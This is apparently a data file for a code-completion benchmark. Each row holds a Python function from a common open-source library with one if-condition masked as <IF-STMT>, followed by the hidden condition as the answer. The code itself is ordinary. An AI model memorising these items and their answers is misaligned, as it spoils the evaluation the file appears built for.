2641,"def main(args):<tab>optim = Adam({""lr"": args.lr})<tab>elbo = JitTrace_ELBO() if args.jit else Trace_ELBO()<tab>svi = SVI(model, guide, optim, loss=elbo)<tab>pyro.clear_param_store()<tab>for j in range(args.num_epochs):<tab><tab>loss = svi.step(data)<tab><tab><IF-STMT><tab><tab><tab>logging.info(""[epoch %04d] loss: %.4f"" % (j + 1, loss))<tab>for name, value in pyro.get_param_store().items():<tab><tab>logging.info(name)<tab><tab>logging.info(value.detach().cpu().numpy())",if j % 100 == 0 :,174
2642,"def create_var_list(scope, var_lists, shape):<tab>vars = []<tab>for idx, v in enumerate(var_lists):<tab><tab>name = ""{}_{}"".format(scope, idx)<tab><tab><IF-STMT><tab><tab><tab>var = fluid.data(name, shape=v.shape)<tab><tab>else:<tab><tab><tab>var = fluid.data(name, shape=shape + list(v[0].shape))<tab><tab>var.stop_gradient = False<tab><tab>vars.append(var)<tab>return vars",if shape is None :,126
2643,"def dr_relation(self, C, trans, nullable):<tab>dr_set = {}<tab>state, N = trans<tab>terms = []<tab>g = self.lr0_goto(C[state], N)<tab>for p in g:<tab><tab>if p.lr_index < p.len - 1:<tab><tab><tab>a = p.prod[p.lr_index + 1]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if a not in terms:<tab><tab><tab><tab><tab>terms.append(a)<tab># This extra bit is to handle the start state<tab>if state == 0 and N == self.grammar.Productions[0].prod[0]:<tab><tab>terms.append(""$end"")<tab>return terms",if a in self . grammar . Terminals :,174
2644,"def get_field_values(self, fields):<tab>field_values = []<tab>for field in fields:<tab><tab># Title is special case<tab><tab><IF-STMT><tab><tab><tab>value = self.get_title_display()<tab><tab>elif field == ""country"":<tab><tab><tab>try:<tab><tab><tab><tab>value = self.country.printable_name<tab><tab><tab>except exceptions.ObjectDoesNotExist:<tab><tab><tab><tab>value = """"<tab><tab>elif field == ""salutation"":<tab><tab><tab>value = self.salutation<tab><tab>else:<tab><tab><tab>value = getattr(self, field)<tab><tab>field_values.append(value)<tab>return field_values","if field == ""title"" :",158
2645,"def run(self, event, lambda_context):<tab>self.setup_exec_environment(event)<tab>resource_sets = self.get_resource_sets(event)<tab>result_sets = {}<tab>for (account_id, region), rarns in resource_sets.items():<tab><tab>self.assume_member({""account"": account_id, ""region"": region})<tab><tab>resources = self.resolve_resources(event)<tab><tab>rset = result_sets.setdefault((account_id, region), [])<tab><tab><IF-STMT><tab><tab><tab>rset.extend(self.run_resource_set(event, resources))<tab>return result_sets",if resources :,151
2646,"def read(self, sock):<tab>data = self.sock.recv(64 * 1024)<tab>ready_to_read, ready_to_write, in_error = select.select(<tab><tab>[self.sock], [], [], self.timeout<tab>)<tab>while len(ready_to_read) == 1:<tab><tab>more_data = self.sock.recv(64 * 1024)<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>data = data + more_data<tab><tab>ready_to_read, ready_to_write, in_error = select.select(<tab><tab><tab>[self.sock], [], [], self.timeout<tab><tab>)<tab>return data",if len ( more_data ) == 0 :,164
2647,"def _check_ids(el, filename, parent_id):<tab>""""""Recursively walks through tree and check if every object has ID""""""<tab>for child in el:<tab><tab><IF-STMT><tab><tab><tab>msg = ""Widget has no ID in %s; class %s; Parent id: %s"" % (<tab><tab><tab><tab>filename,<tab><tab><tab><tab>child.attrib[""class""],<tab><tab><tab><tab>parent_id,<tab><tab><tab>)<tab><tab><tab>assert ""id"" in child.attrib and child.attrib[""id""], msg<tab><tab><tab>for subel in child:<tab><tab><tab><tab>if subel.tag == ""child"":<tab><tab><tab><tab><tab>_check_ids(subel, filename, child.attrib[""id""])","if child . tag == ""object"" :",173
2648,"def get(self, request, *args, **kwargs):<tab>url = self.get_redirect_url(**kwargs)<tab>if url:<tab><tab><IF-STMT><tab><tab><tab>return http.HttpResponsePermanentRedirect(url)<tab><tab>else:<tab><tab><tab>return http.HttpResponseRedirect(url)<tab>else:<tab><tab>logger.warning(<tab><tab><tab>""Gone: %s"" % self.request.path,<tab><tab><tab>extra={""status_code"": 410, ""request"": self.request},<tab><tab>)<tab><tab>return http.HttpResponseGone()",if self . permanent :,135
2649,"def test_representation(self):<tab># Test that the state space representation in the measurement error<tab># case is correct<tab>for name in self.model.ssm.shapes.keys():<tab><tab>if name == ""obs"":<tab><tab><tab>pass<tab><tab><IF-STMT><tab><tab><tab>actual = self.results2.filter_results.obs_cov<tab><tab><tab>desired = np.diag(self.true_measurement_error_variances)[:, :, np.newaxis]<tab><tab><tab>assert_equal(actual, desired)<tab><tab>else:<tab><tab><tab>assert_equal(<tab><tab><tab><tab>getattr(self.results2.filter_results, name),<tab><tab><tab><tab>getattr(self.results.filter_results, name),<tab><tab><tab>)","elif name == ""obs_cov"" :",179
2650,"def process_formdata(self, valuelist):<tab>if valuelist:<tab><tab>date_str = "" "".join(valuelist)<tab><tab><IF-STMT><tab><tab><tab>self.data = None<tab><tab><tab>raise ValidationError(self.gettext(""Please input a date/time value""))<tab><tab>parse_kwargs = self.parse_kwargs.copy()<tab><tab>if ""default"" not in parse_kwargs:<tab><tab><tab>try:<tab><tab><tab><tab>parse_kwargs[""default""] = self.default()<tab><tab><tab>except TypeError:<tab><tab><tab><tab>parse_kwargs[""default""] = self.default<tab><tab>try:<tab><tab><tab>self.data = parser.parse(date_str, **parse_kwargs)<tab><tab>except ValueError:<tab><tab><tab>self.data = None<tab><tab><tab>raise ValidationError(self.gettext(""Invalid date/time input""))",if not date_str :,196
2651,"def get_bounding_box(self):<tab>for key in self.h5f[""Data_Products""].keys():<tab><tab><IF-STMT><tab><tab><tab>lats = self.h5f[""Data_Products""][key][key + ""_Gran_0""].attrs[<tab><tab><tab><tab>""G-Ring_Latitude""<tab><tab><tab>]<tab><tab><tab>lons = self.h5f[""Data_Products""][key][key + ""_Gran_0""].attrs[<tab><tab><tab><tab>""G-Ring_Longitude""<tab><tab><tab>]<tab><tab><tab>break<tab>else:<tab><tab>raise KeyError(""Cannot find bounding coordinates!"")<tab>return lons.ravel(), lats.ravel()","if key . startswith ( ""VIIRS"" ) and key . endswith ( ""GEO"" ) :",175
2652,"def _get_doc_contents(self, attr_name):<tab>value = getattr(self, attr_name)<tab>if isinstance(value, BasicCommand.FROM_FILE):<tab><tab><IF-STMT><tab><tab><tab>trailing_path = value.filename<tab><tab>else:<tab><tab><tab>trailing_path = os.path.join(self.name, attr_name + "".rst"")<tab><tab>root_module = value.root_module<tab><tab>doc_path = os.path.join(<tab><tab><tab>os.path.abspath(os.path.dirname(root_module.__file__)),<tab><tab><tab>""examples"",<tab><tab><tab>trailing_path,<tab><tab>)<tab><tab>with _open(doc_path) as f:<tab><tab><tab>return f.read()<tab>else:<tab><tab>return value",if value . filename is not None :,191
2653,"def __truediv__(self, val):<tab>if isinstance(val, Vector3):<tab><tab>if val.x == 0 or val.y == 0 or val.z == 0:<tab><tab><tab>raise ZeroDivisionError()<tab><tab>gd_obj = lib.godot_vector3_operator_divide_vector(self._gd_ptr, val._gd_ptr)<tab>else:<tab><tab><IF-STMT><tab><tab><tab>raise ZeroDivisionError()<tab><tab>gd_obj = lib.godot_vector3_operator_divide_scalar(self._gd_ptr, val)<tab>return Vector3.build_from_gdobj(gd_obj)",if val is 0 :,148
2654,"def _get_all_plugin_configs(self):<tab>with opentracing.global_tracer().start_active_span(""_get_all_plugin_configs""):<tab><tab><IF-STMT><tab><tab><tab>self._plugin_configs = {<tab><tab><tab><tab>pc.identifier: pc for pc in PluginConfiguration.objects.all()<tab><tab><tab>}<tab><tab>return self._plugin_configs","if not hasattr ( self , ""_plugin_configs"" ) :",94
2655,"def msg(self, module, level, msg, *args, **kwargs):<tab>if self.level < level or level > len(LEVELS):<tab><tab>return<tab>msg = str(msg).format(*args, **kwargs)<tab>with self.lock:<tab><tab>self.output.write(FORMAT.format(module=module, level=LEVELS[level], msg=msg))<tab><tab><IF-STMT><tab><tab><tab>self.output.flush()","if hasattr ( self . output , ""flush"" ) :",111
2656,"def opentemplatefile(self, options, fulltemplatepath):<tab>""""""Opens the template file (if required).""""""<tab>if fulltemplatepath is not None:<tab><tab><IF-STMT><tab><tab><tab>return open(fulltemplatepath, ""r"")<tab><tab>else:<tab><tab><tab>self.warning(""missing template file %s"" % fulltemplatepath)<tab>return None",if os . path . isfile ( fulltemplatepath ) :,92
2657,"def b58(args, parser):<tab>for arg in args.input:<tab><tab>blob, is_hex_input = parse_arg(arg, args.b)<tab><tab><IF-STMT><tab><tab><tab>print(b2h(blob))<tab><tab><tab>print(b2a_base58(blob))<tab><tab><tab>print(b2a_hashed_base58(blob))<tab><tab>else:<tab><tab><tab>print(b2h(blob))<tab><tab><tab>print(b2a_base58(blob))<tab><tab><tab>try:<tab><tab><tab><tab>blob = a2b_hashed_base58(arg)<tab><tab><tab><tab>print(""valid hashed b58"")<tab><tab><tab><tab>print(""contents: "", b2h(blob))<tab><tab><tab>except Exception:<tab><tab><tab><tab>print(""not hashed b58"")",if is_hex_input :,196
2658,"def edit_file(self, filename):<tab>import subprocess<tab>editor = self.get_editor()<tab>if self.env:<tab><tab>environ = os.environ.copy()<tab><tab>environ.update(self.env)<tab>else:<tab><tab>environ = None<tab>try:<tab><tab>c = subprocess.Popen(<tab><tab><tab>""{} {}"".format(shlex_quote(editor), shlex_quote(filename)),<tab><tab><tab>env=environ,<tab><tab><tab>shell=True,<tab><tab>)<tab><tab>exit_code = c.wait()<tab><tab><IF-STMT><tab><tab><tab>raise ClickException(""{}: Editing failed!"".format(editor))<tab>except OSError as e:<tab><tab>raise ClickException(""{}: Editing failed: {}"".format(editor, e))",if exit_code != 0 :,174
2659,"def ascii85decode(data):<tab>n = b = 0<tab>out = """"<tab>for c in data:<tab><tab><IF-STMT><tab><tab><tab>n += 1<tab><tab><tab>b = b * 85 + (ord(c) - 33)<tab><tab><tab>if n == 5:<tab><tab><tab><tab>out += struct.pack("">L"", b)<tab><tab><tab><tab>n = b = 0<tab><tab>elif c == ""z"":<tab><tab><tab>assert n == 0<tab><tab><tab>out += ""\0\0\0\0""<tab><tab>elif c == ""~"":<tab><tab><tab>if n:<tab><tab><tab><tab>for _ in range(5 - n):<tab><tab><tab><tab><tab>b = b * 85 + 84<tab><tab><tab><tab>out += struct.pack("">L"", b)[: n - 1]<tab><tab><tab>break<tab>return out","if ""!"" <= c and c <= ""u"" :",200
2660,"def channel_to_netid(channel_name_or_id):<tab>try:<tab><tab>channel = int(channel_name_or_id)<tab>except ValueError:<tab><tab>netid = ""NETID_{}"".format(channel_name_or_id.upper())<tab><tab><IF-STMT><tab><tab><tab>channel = getattr(ics, netid)<tab><tab>else:<tab><tab><tab>raise ValueError(<tab><tab><tab><tab>""channel must be an integer or "" ""a valid ICS channel name""<tab><tab><tab>)<tab>return channel","if hasattr ( ics , netid ) :",129
2661,"def _find_this_and_next_frame(self, stack):<tab>for i in range(len(stack)):<tab><tab><IF-STMT><tab><tab><tab>if i == len(stack) - 1:  # last frame<tab><tab><tab><tab>return stack[i], None<tab><tab><tab>else:<tab><tab><tab><tab>return stack[i], stack[i + 1]<tab>raise AssertionError(""Frame doesn't exist anymore"")",if stack [ i ] . id == self . _frame_id :,106
2662,"def nested_update(org_dict, upd_dict):<tab>for key, value in upd_dict.items():<tab><tab>if isinstance(value, dict):<tab><tab><tab>if key in org_dict:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>raise ValueError(<tab><tab><tab><tab><tab><tab>""Mismatch between org_dict and upd_dict at node {}"".format(key)<tab><tab><tab><tab><tab>)<tab><tab><tab><tab>nested_update(org_dict[key], value)<tab><tab><tab>else:<tab><tab><tab><tab>org_dict[key] = value<tab><tab>else:<tab><tab><tab>org_dict[key] = value","if not isinstance ( org_dict [ key ] , dict ) :",161
2663,"def __myreduce(self, elements):<tab>first = elements[0]<tab>for i in range(1, len(elements), 2):<tab><tab><IF-STMT><tab><tab><tab>first = first and elements[i + 1]<tab><tab>elif elements[i] == ""or"":<tab><tab><tab>first = first or elements[i + 1]<tab>self.stack = []<tab>if isinstance(first, list):<tab><tab>return [first]<tab>return first","if elements [ i ] == ""and"" :",112
2664,"def test_to_json_na(self):<tab># Set a value as nan and make sure it's written<tab>self.df.loc[self.df[""BoroName""] == ""Queens"", ""Shape_Area""] = np.nan<tab>text = self.df.to_json()<tab>data = json.loads(text)<tab>self.assertTrue(len(data[""features""]) == 5)<tab>for f in data[""features""]:<tab><tab>props = f[""properties""]<tab><tab>self.assertEqual(len(props), 4)<tab><tab><IF-STMT><tab><tab><tab>self.assertTrue(props[""Shape_Area""] is None)","if props [ ""BoroName"" ] == ""Queens"" :",160
2665,"def process(self, resources):<tab>resources = self.filter_resources(resources, ""TableStatus"", self.valid_status)<tab>if not len(resources):<tab><tab>return<tab>futures = []<tab>client = local_session(self.manager.session_factory).client(""dynamodb"")<tab>with self.executor_factory(max_workers=2) as w:<tab><tab>for table_set in chunks(resources, 20):<tab><tab><tab>futures.append(w.submit(self.delete_table, client, table_set))<tab><tab>for f in as_completed(futures):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.log.error(<tab><tab><tab><tab><tab>""Exception deleting dynamodb table set \n %s"" % (f.exception())<tab><tab><tab><tab>)",if f . exception ( ) :,184
2666,"def skip_loss_scaling(self, backend_config=None):<tab>if self.loss_scaling is not False:<tab><tab><IF-STMT><tab><tab><tab>msg = ""loss_scaling is tested when dtype is float16.""<tab><tab><tab>return True, msg<tab><tab>if backend_config is not None and not backend_config.use_cuda:<tab><tab><tab>msg = ""loss_scaling is tested when use_cuda is True.""<tab><tab><tab>return True, msg<tab>return False, None",if self . dtype != numpy . float16 :,120
2667,"def writeLibraryControllers(fp, human, meshes, skel, config, shapes=None):<tab>progress = Progress(len(meshes), None)<tab>fp.write(""\n  <library_controllers>\n"")<tab>for mIdx, mesh in enumerate(meshes):<tab><tab>subprog = Progress()(0, 0.5)<tab><tab>if skel:<tab><tab><tab>writeSkinController(fp, human, mesh, skel, config)<tab><tab>subprog(0.5, 1)<tab><tab><IF-STMT><tab><tab><tab>writeMorphController(fp, mesh, shapes[mIdx], config)<tab><tab>progress.step()<tab>fp.write(""  </library_controllers>\n"")",if shapes is not None :,172
2668,"def doit():<tab>recipes_path = expanduser(""recipes.pprint"")<tab>recipe_dicts = eval(open(recipes_path).read())<tab>for r in recipe_dicts:<tab><tab>for key in r.keys():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>del r[key]<tab><tab>for c in r[""comments""]:<tab><tab><tab>for key in c.keys():<tab><tab><tab><tab>if key not in (""comment"", ""title""):<tab><tab><tab><tab><tab>del c[key]<tab>f = open(""stripped.pprint"", ""w"")<tab>f.write(pformat(recipe_dicts))<tab>f.close()","if key not in ( ""desc"" , ""comments"" ) :",163
2669,"def _dispatchBubblingEvent(self, tag, evtType, evtObject):<tab>for node in tag.parents:<tab><tab><IF-STMT>  # pragma: no cover<tab><tab><tab>break<tab><tab>if not node._listeners:<tab><tab><tab>continue<tab><tab>if evtObject._stoppedPropagation:  # pragma: no cover<tab><tab><tab>continue<tab><tab>capture_listeners, bubbling_listeners = self._get_listeners(<tab><tab><tab>node, evtType<tab><tab>)  # pylint:disable=unused-variable<tab><tab>for c in bubbling_listeners:<tab><tab><tab>evtObject.currentTarget = node._node<tab><tab><tab>self.do_dispatch(c, evtObject)",if node is None :,165
2670,"def connect(self):<tab>if self.session is None:<tab><tab>self.session = requests.Session()<tab><tab><IF-STMT><tab><tab><tab>self.session.mount(""httpsds8k://"", requests.adapters.HTTPAdapter())<tab><tab>else:<tab><tab><tab>self.session.mount(""https://"", requests.adapters.HTTPAdapter())<tab><tab>self.session.verify = self.verify","if isinstance ( self . verify , six . string_types ) :",100
2671,"def get_latest_tasks(cls, tasks):<tab>tasks_group = {}<tab>for task in tasks:<tab><tab>task_key = cls.task_key(<tab><tab><tab>task_id=task.f_task_id, role=task.f_role, party_id=task.f_party_id<tab><tab>)<tab><tab>if task_key not in tasks_group:<tab><tab><tab>tasks_group[task_key] = task<tab><tab><IF-STMT><tab><tab><tab># update new version task<tab><tab><tab>tasks_group[task_key] = task<tab>return tasks_group",elif task . f_task_version > tasks_group [ task_key ] . f_task_version :,160
2672,"def wrapper(cached=True, reset=False):<tab>nonlocal cached_venv_dir<tab>if not cached or not cached_venv_dir or reset:<tab><tab>venv_dir = os.environ.get(""_VENV_DIR_"") or load_settings(lazy=True).get(<tab><tab><tab>""venv_dir""<tab><tab>)<tab><tab>if venv_dir:  # no cov<tab><tab><tab><IF-STMT><tab><tab><tab><tab>venv_dir = VENV_DIR_ISOLATED<tab><tab><tab>elif venv_dir == ""shared"":<tab><tab><tab><tab>venv_dir = VENV_DIR_SHARED<tab><tab>else:  # no cov<tab><tab><tab>venv_dir = VENV_DIR_SHARED<tab><tab>cached_venv_dir = venv_dir<tab>return cached_venv_dir","if venv_dir == ""isolated"" :",186
2673,"def __walk_dir_tree(self, dirname):<tab>dir_list = []<tab>self.__logger.debug(""__walk_dir_tree. START dir=%s"", dirname)<tab>for f in os.listdir(dirname):<tab><tab>current = os.path.join(dirname, f)<tab><tab>if os.path.isfile(current) and f.endswith(""py""):<tab><tab><tab>if self.module_registrant:<tab><tab><tab><tab>self._load_py_from_file(current)<tab><tab><tab>dir_list.append(current)<tab><tab>elif os.path.isdir(current):<tab><tab><tab>ret = self.__walk_dir_tree(current)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>dir_list.append((f, ret))<tab>return dir_list",if ret :,184
2674,"def read_ansible_config(project_path, variables_of_interest):<tab>fnames = [""/etc/ansible/ansible.cfg""]<tab>if project_path:<tab><tab>fnames.append(os.path.join(project_path, ""ansible.cfg""))<tab>values = {}<tab>try:<tab><tab>parser = ConfigParser()<tab><tab>parser.read(fnames)<tab><tab><IF-STMT><tab><tab><tab>for var in variables_of_interest:<tab><tab><tab><tab>if var in parser[""defaults""]:<tab><tab><tab><tab><tab>values[var] = parser[""defaults""][var]<tab>except Exception:<tab><tab>logger.exception(""Failed to read ansible configuration(s) {}"".format(fnames))<tab>return values","if ""defaults"" in parser :",166
2675,"def inference(self, x_all, data_loader):<tab>for i in range(len(self.convs)):<tab><tab>output = []<tab><tab>for src_id, edge_index, size in data_loader:<tab><tab><tab>x = x_all[src_id].to(self.device)<tab><tab><tab>edge_index = edge_index.to(self.device)<tab><tab><tab>x = self.convs[i](x, edge_index)<tab><tab><tab>x = x[: size[1]]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>x = F.relu(x)<tab><tab><tab>output.append(x.cpu())<tab><tab>x_all = torch.cat(output, dim=0)<tab>return F.log_softmax(x_all, dim=-1)",if i != self . num_layers - 1 :,193
2676,"def guard_transform(transform):<tab>""""""Return an Affine transformation instance.""""""<tab>if not isinstance(transform, Affine):<tab><tab><IF-STMT><tab><tab><tab>raise TypeError(<tab><tab><tab><tab>""GDAL-style transforms have been deprecated.  This ""<tab><tab><tab><tab>""exception will be raised for a period of time to highlight ""<tab><tab><tab><tab>""potentially confusing errors, but will eventually be removed.""<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>transform = Affine(*transform)<tab>return transform",if tastes_like_gdal ( transform ) :,125
2677,"def _tokenize(self, text):<tab>if tf.is_tensor(text):<tab><tab>rank = len(text.shape)<tab><tab><IF-STMT><tab><tab><tab>return self._tokenize_tensor(text)<tab><tab>elif rank == 1:<tab><tab><tab>return self._tokenize_batch_tensor(text)<tab><tab>else:<tab><tab><tab>raise ValueError(""Unsupported tensor rank %d for tokenization"" % rank)<tab>elif isinstance(text, list):<tab><tab>return list(map(self.tokenize, text))<tab>else:<tab><tab>text = tf.compat.as_text(text)<tab><tab>return self._tokenize_string(text)",if rank == 0 :,152
2678,"def validate_export(namespace):<tab>destination = namespace.destination<tab>if destination == ""file"":<tab><tab>if namespace.path is None or namespace.format_ is None:<tab><tab><tab>raise CLIError(""usage error: --path PATH --format FORMAT"")<tab>elif destination == ""appconfig"":<tab><tab><IF-STMT><tab><tab><tab>raise CLIError(""usage error: --config-name NAME | --connection-string STR"")<tab>elif destination == ""appservice"":<tab><tab>if namespace.appservice_account is None:<tab><tab><tab>raise CLIError(""usage error: --appservice-account NAME_OR_ID"")",if ( namespace . dest_name is None ) and ( namespace . dest_connection_string is None ) :,159
2679,"def dispatch(self, request, *args, **kwargs):<tab>settings = self.get_settings(self.form_class.settings)<tab>initial = self.get_initial_form_data(settings)<tab>form = self.form_class(request=request, initial=initial)<tab>if request.method == ""POST"":<tab><tab>form = self.form_class(<tab><tab><tab>request.POST, request.FILES, request=request, initial=initial<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>form.save(settings)<tab><tab><tab>messages.success(request, _(""Settings have been saved.""))<tab><tab><tab>return redirect(request.path_info)<tab>return self.render(request, {""form"": form, ""form_settings"": settings})",if form . is_valid ( ) :,180
2680,"def get_modules(path):<tab>modules = set()<tab>for dirpath, dirnames, filenames in os.walk(path):<tab><tab>for filename in filenames:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>cutoff = len(path) + 1<tab><tab><tab><tab>fullpath = os.path.join(dirpath[cutoff:], filename)<tab><tab><tab><tab>modules.add(fullpath)<tab>return modules","if filename . endswith ( "".py"" ) :",95
2681,"def _make_input_layers(self, rebuild=False):<tab>for name, layer in self.layer_map.items():<tab><tab>layer.left_in_edges = len(layer.in_edges)<tab><tab>if len(layer.in_edges) == 0:<tab><tab><tab>if rebuild:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>self.input_layers.append(name)<tab><tab><tab>else:<tab><tab><tab><tab>self.input_layers.append(name)","if not layer . get_attr ( ""scope"" ) :",123
2682,"def _get_status(self):<tab>connection_errors_allowed = 10<tab>while True:<tab><tab>try:<tab><tab><tab>content = requests.get(self.__status_details_url).json()<tab><tab>except (requests.ConnectionError, requests.HTTPError) as e:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>yield e<tab><tab><tab>content = {""processed"": False, ""code"": ""being_processed""}<tab><tab><tab>connection_errors_allowed -= 1<tab><tab>yield content",if not connection_errors_allowed :,119
2683,"def show(self):<tab>if len(self.figures.keys()) == 0:<tab><tab>return<tab>if not SETTINGS.plot_split:<tab><tab>if SETTINGS.plot_backend.lower() == ""qt4agg"":<tab><tab><tab>self.tabbed_qt4_window()<tab><tab><IF-STMT><tab><tab><tab>self.tabbed_qt5_window()<tab><tab>elif SETTINGS.plot_backend.lower() == ""tkagg"":<tab><tab><tab>self.tabbed_tk_window()<tab><tab>else:<tab><tab><tab>plt.show()<tab>else:<tab><tab>plt.show()","elif SETTINGS . plot_backend . lower ( ) == ""qt5agg"" :",161
2684,"def emit(self, record):<tab>msg = self.format(record)<tab>self.lock.acquire()<tab>try:<tab><tab>msg = self.encode(msg)<tab><tab><IF-STMT><tab><tab><tab>self.perform_rollover()<tab><tab>self.write(msg)<tab><tab>self.flush()<tab>finally:<tab><tab>self.lock.release()","if self . should_rollover ( record , len ( msg ) ) :",96
2685,"def install(self, unicode=False, names=None):<tab>import __builtin__<tab>__builtin__.__dict__[""_""] = unicode and self.ugettext or self.gettext<tab>if hasattr(names, ""__contains__""):<tab><tab><IF-STMT><tab><tab><tab>__builtin__.__dict__[""gettext""] = __builtin__.__dict__[""_""]<tab><tab>if ""ngettext"" in names:<tab><tab><tab>__builtin__.__dict__[""ngettext""] = (<tab><tab><tab><tab>unicode and self.ungettext or self.ngettext<tab><tab><tab>)<tab><tab>if ""lgettext"" in names:<tab><tab><tab>__builtin__.__dict__[""lgettext""] = self.lgettext<tab><tab>if ""lngettext"" in names:<tab><tab><tab>__builtin__.__dict__[""lngettext""] = self.lngettext","if ""gettext"" in names :",181
2686,"def test_simulate_moment_steps_set_state(dtype):<tab>q0, q1 = cirq.LineQubit.range(2)<tab>circuit = cirq.Circuit(cirq.H(q0), cirq.H(q1), cirq.H(q0), cirq.H(q1))<tab>simulator = cirq.Simulator(dtype=dtype)<tab>for i, step in enumerate(simulator.simulate_moment_steps(circuit)):<tab><tab>np.testing.assert_almost_equal(step.state_vector(), np.array([0.5] * 4))<tab><tab><IF-STMT><tab><tab><tab>step.set_state_vector(np.array([1, 0, 0, 0], dtype=dtype))",if i == 0 :,179
2687,"def get_config_settings():<tab>config = {}<tab>for plugin in extension_loader.MANAGER.plugins:<tab><tab>fn_name = plugin.name<tab><tab>function = plugin.plugin<tab><tab># if a function takes config...<tab><tab><IF-STMT><tab><tab><tab>fn_module = importlib.import_module(function.__module__)<tab><tab><tab># call the config generator if it exists<tab><tab><tab>if hasattr(fn_module, ""gen_config""):<tab><tab><tab><tab>config[fn_name] = fn_module.gen_config(function._takes_config)<tab>return yaml.safe_dump(config, default_flow_style=False)","if hasattr ( function , ""_takes_config"" ) :",161
2688,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab>if tt == 10:<tab><tab><tab>self.set_app_id(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 18:<tab><tab><tab>self.set_queue_name(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 24:<tab><tab><tab>self.set_pause(d.getBoolean())<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 0 :,152
2689,"def enable(self):<tab>""""""enable the patch.""""""<tab>for patch in self.dependencies:<tab><tab>patch.enable()<tab>if not self.enabled:<tab><tab>pyv = sys.version_info[0]<tab><tab>if pyv == 2:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>return  # skip patch activation<tab><tab><tab>if not self.PY2:<tab><tab><tab><tab>raise IncompatiblePatch(""Python 2 not supported!"")<tab><tab>if pyv == 3:<tab><tab><tab>if self.PY3 == SKIP:<tab><tab><tab><tab>return  # skip patch activation<tab><tab><tab>if not self.PY3:<tab><tab><tab><tab>raise IncompatiblePatch(""Python 3 not supported!"")<tab><tab>self.pre_enable()<tab><tab>self.do_enable()<tab><tab>self.enabled = True",if self . PY2 == SKIP :,191
2690,"def to_dict(self) -> JSONDict:<tab>data = dict()<tab>for key in iter(self.__dict__):<tab><tab>if key == ""bot"" or key.startswith(""_""):<tab><tab><tab>continue<tab><tab>value = self.__dict__[key]<tab><tab><IF-STMT><tab><tab><tab>if hasattr(value, ""to_dict""):<tab><tab><tab><tab>data[key] = value.to_dict()<tab><tab><tab>else:<tab><tab><tab><tab>data[key] = value<tab>if data.get(""from_user""):<tab><tab>data[""from""] = data.pop(""from_user"", None)<tab>return data",if value is not None :,148
2691,"def _resolve_result(self, f=None):<tab>try:<tab><tab>if f:<tab><tab><tab>results = f.result()<tab><tab>else:<tab><tab><tab>results = list(map(self._client.results.get, self.msg_ids))<tab><tab>if self._single_result:<tab><tab><tab>r = results[0]<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise r<tab><tab>else:<tab><tab><tab>results = error.collect_exceptions(results, self._fname)<tab><tab>self._success = True<tab><tab>self.set_result(self._reconstruct_result(results))<tab>except Exception as e:<tab><tab>self._success = False<tab><tab>self.set_exception(e)","if isinstance ( r , Exception ) :",174
2692,"def print_monitor(args):<tab>from pylearn2.utils import serial<tab>import gc<tab>for model_path in args:<tab><tab>if len(args) > 1:<tab><tab><tab>print(model_path)<tab><tab>model = serial.load(model_path)<tab><tab>monitor = model.monitor<tab><tab>del model<tab><tab>gc.collect()<tab><tab>channels = monitor.channels<tab><tab><IF-STMT><tab><tab><tab>print(""old file, not all fields parsed correctly"")<tab><tab>else:<tab><tab><tab>print(""epochs seen: "", monitor._epochs_seen)<tab><tab>print(""time trained: "", max(channels[key].time_record[-1] for key in channels))<tab><tab>for key in sorted(channels.keys()):<tab><tab><tab>print(key, "":"", channels[key].val_record[-1])","if not hasattr ( monitor , ""_epochs_seen"" ) :",200
2693,"def apply(self, **kwargs: Any) -> None:<tab>for node in self.document.traverse(addnodes.index):<tab><tab><IF-STMT><tab><tab><tab>msg = (<tab><tab><tab><tab>__(<tab><tab><tab><tab><tab>""4 column based index found. ""<tab><tab><tab><tab><tab>""It might be a bug of extensions you use: %r""<tab><tab><tab><tab>)<tab><tab><tab><tab>% node[""entries""]<tab><tab><tab>)<tab><tab><tab>logger.warning(msg, location=node)<tab><tab><tab>for i, entry in enumerate(node[""entries""]):<tab><tab><tab><tab>if len(entry) == 4:<tab><tab><tab><tab><tab>node[""entries""][i] = entry + (None,)","if ""entries"" in node and any ( len ( entry ) == 4 for entry in node [ ""entries"" ] ) :",183
2694,"def cleanup_empty_directories(path: str):<tab>""""""Remove all empty folders inside (and including) 'path'""""""<tab>path = os.path.normpath(path)<tab>while 1:<tab><tab>repeat = False<tab><tab>for root, dirs, files in os.walk(path, topdown=False):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>try:<tab><tab><tab><tab><tab>remove_dir(root)<tab><tab><tab><tab><tab>repeat = True<tab><tab><tab><tab>except:<tab><tab><tab><tab><tab>pass<tab><tab>if not repeat:<tab><tab><tab>break<tab># Only remove if main folder is now also empty<tab>if not os.listdir(path):<tab><tab>try:<tab><tab><tab>remove_dir(path)<tab><tab>except:<tab><tab><tab>pass",if not dirs and not files and root != path :,187
2695,"def expect_flow_sequence_item(self):<tab>if isinstance(self.event, SequenceEndEvent):<tab><tab>self.indent = self.indents.pop()<tab><tab>self.flow_level -= 1<tab><tab><IF-STMT><tab><tab><tab>self.write_indicator(u"","", False)<tab><tab><tab>self.write_indent()<tab><tab>self.write_indicator(u""]"", False)<tab><tab>self.state = self.states.pop()<tab>else:<tab><tab>self.write_indicator(u"","", False)<tab><tab>if self.canonical or self.column > self.best_width:<tab><tab><tab>self.write_indent()<tab><tab>self.states.append(self.expect_flow_sequence_item)<tab><tab>self.expect_node(sequence=True)",if self . canonical :,185
